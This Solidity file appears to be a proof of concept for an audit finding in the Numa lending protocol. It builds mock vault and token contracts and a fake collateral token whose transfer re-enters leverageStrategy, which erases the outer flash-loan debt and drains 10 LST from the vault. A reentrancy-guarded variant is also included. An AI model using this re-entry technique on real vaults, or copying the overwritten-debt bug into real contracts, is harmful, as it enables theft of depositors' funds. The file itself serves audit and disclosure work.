// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Numa — H-1 (Sherlock 2024-12, issue 39)
    CNumaToken.leverageStrategy accepts a caller-chosen collateral token.
    That token's transfer reenters leverageStrategy. NumaVault.borrowLeverage
    stores only the latest amount in leverageDebt, and repayLeverage pays that
    amount and zeroes it. The inner repay clears the debt, so the outer flash
    borrow of LST is never returned. The LST sits in cNuma and the vault price
    falls by the unpaid amount.

    Vault starts with 11 LST. The outer borrow is 10 LST. The reentrant borrow
    is 1 wei and is repaid. 10 LST remains in cNuma. leverageDebt is 0.
*/

contract Lst {
    string public symbol = "LST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface ICollateral {
    function mint(uint256 amount) external returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Vault {
    Lst public lst;
    address public cNuma;
    uint256 public leverageDebt;
    bool public paused;

    constructor(Lst _lst) {
        lst = _lst;
    }

    function setCNuma(address _cNuma) external {
        cNuma = _cNuma;
    }

    /// borrowLeverage from NumaVault.sol — only the latest amount is stored.
    function borrowLeverage(uint256 _amount, bool _closePosition) external {
        if ((msg.sender == cNuma) && (!_closePosition)) {
            lst.transfer(msg.sender, _amount);
            // @> VULN: leverageDebt is replaced, not added, so a reentrant borrow erases the outer flash debt
            leverageDebt = _amount;
        } else {
            revert("not allowed");
        }
    }

    /// repayLeverage from NumaVault.sol — pays whatever leverageDebt currently is, then zeroes it.
    function repayLeverage(bool _closePosition) external {
        if ((msg.sender == cNuma) && (!_closePosition)) {
            uint256 owed = leverageDebt;
            leverageDebt = 0;
            if (owed > 0) {
                lst.transferFrom(msg.sender, address(this), owed);
            }
            lastRepaid = owed;
        } else {
            revert("not allowed");
        }
    }

    uint256 public lastRepaid;
}

contract CNuma {
    Vault public vault;
    Lst public lst;

    constructor(Vault _vault, Lst _lst) {
        vault = _vault;
        lst = _lst;
    }

    /// leverageStrategy from CNumaToken.sol. The collateral token is caller-chosen.
    function leverageStrategy(uint256 _suppliedAmount, uint256 _borrowAmount, address _collateral, uint256 _strategyIndex)
        external
    {
        _strategyIndex;
        vault.borrowLeverage(_borrowAmount, false);
        if (_suppliedAmount > 0) {
            lst.transferFrom(msg.sender, address(this), _suppliedAmount);
        }
        ICollateral(_collateral).mint(_suppliedAmount + _borrowAmount);
        uint256 receivedtokens = 1;
        require(receivedtokens > 0, "no collateral");
        ICollateral(_collateral).transfer(msg.sender, receivedtokens);
        lst.approve(address(vault), _borrowAmount);
        vault.repayLeverage(false);
    }
}

contract FakeCollateral is ICollateral {
    CNuma public cNuma;
    bool public entered;

    constructor(CNuma _cNuma) {
        cNuma = _cNuma;
    }

    function mint(uint256) external returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external returns (bool) {
        if (!entered) {
            entered = true;
            cNuma.leverageStrategy(0, 1, address(this), 0);
        }
        return true;
    }
}

contract CNumaGuarded {
    Vault public vault;
    Lst public lst;
    uint256 private locked;

    constructor(Vault _vault, Lst _lst) {
        vault = _vault;
        lst = _lst;
    }

    function leverageStrategy(uint256 _suppliedAmount, uint256 _borrowAmount, address _collateral, uint256 _strategyIndex)
        external
    {
        _strategyIndex;
        require(locked == 0, "reenter");
        locked = 1;
        vault.borrowLeverage(_borrowAmount, false);
        if (_suppliedAmount > 0) {
            lst.transferFrom(msg.sender, address(this), _suppliedAmount);
        }
        ICollateral(_collateral).mint(_suppliedAmount + _borrowAmount);
        ICollateral(_collateral).transfer(msg.sender, 1);
        lst.approve(address(vault), _borrowAmount);
        vault.repayLeverage(false);
        locked = 0;
    }
}

contract GuardedFake is ICollateral {
    CNumaGuarded public cNuma;
    bool public entered;

    constructor(CNumaGuarded _cNuma) {
        cNuma = _cNuma;
    }

    function mint(uint256) external returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external returns (bool) {
        if (!entered) {
            entered = true;
            cNuma.leverageStrategy(0, 1, address(this), 0);
        }
        return true;
    }
}

contract Exploit {
    Lst public lst;
    Vault public vault;
    CNuma public cNuma;
    FakeCollateral public fake;
    uint256 public openingVaultBalance;
    uint256 public stuckInCNuma;
    uint256 public vaultAfter;
    uint256 public debtAfter;

    constructor() {
        lst = new Lst();
        vault = new Vault(lst);
        cNuma = new CNuma(vault, lst);
        vault.setCNuma(address(cNuma));
        fake = new FakeCollateral(cNuma);
        lst.mint(address(vault), 11 ether);
    }

    function run() external {
        openingVaultBalance = lst.balanceOf(address(vault));
        cNuma.leverageStrategy(0, 10 ether, address(fake), 0);
        stuckInCNuma = lst.balanceOf(address(cNuma));
        vaultAfter = lst.balanceOf(address(vault));
        debtAfter = vault.leverageDebt();
        require(openingVaultBalance == 11 ether, "open");
        require(stuckInCNuma == 10 ether, "stuck");
        require(vaultAfter == 1 ether, "price");
        require(debtAfter == 0, "debt");
        require(vault.lastRepaid() == 0, "outer repaid nothing");
        require(fake.entered(), "reentered");
    }
}
